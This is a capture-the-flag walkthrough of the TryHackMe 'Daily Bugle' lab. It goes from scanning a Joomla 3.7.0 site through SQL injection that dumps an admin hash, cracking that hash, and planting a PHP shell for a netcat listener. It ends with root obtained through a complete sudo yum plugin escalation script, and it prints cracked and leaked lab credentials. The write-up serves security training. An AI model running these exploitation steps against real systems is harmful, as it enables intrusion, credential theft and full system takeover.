# Daily Bugle


## Recon

_Port Scan_

```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```


_Gobuster Scan_

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/templates (Status: 301)
/tmp (Status: 301)
```

In the */administrator* we find a joomla login.


Since we don't have much to go on regarding ports, we need to look in the webserver.

We need to find the joomla version, and after looking on the website we don't find the version number there, so we must look for it some other way.

Because we want to avoid *metasploit* as much as posibile we need to read the *auxiliary/scanner* ruby script ourself and find out how that works or to install 

```
sudo apt install joomscan
```

and look for it that way.


```
[+] Detecting Joomla Version                                                                                               
[++] Joomla 3.7.0
```

After we *searchsploit* for it we find an interesting method for sql injection


```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

## Exploiting

By using *john* and waiting for it to find the right *--format* i know that the password is bcrypt which means it's going to be a slow process to crack it.

Cracking the password with *hashcat*


```
hashcat -m 3200 -a 0 hash.txt rockyou.txt

username jonah
password: spiderman123
```

After logging in we edit some already existing .php file with our shell code

```
http://10.10.154.49/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA
```

and setup a *nc* listener


```
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
```

## Privilege Escalation


We found this, maybe we will look into it

```
        public $password = 'nv5uz9r3ZEDzVjNu';
```

This seems to be the password for the jjames user and we ssh'ed into it


By running linpeas we find that *yum* is vulnerable (we can run it with sudo and no passwd is asked)

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```













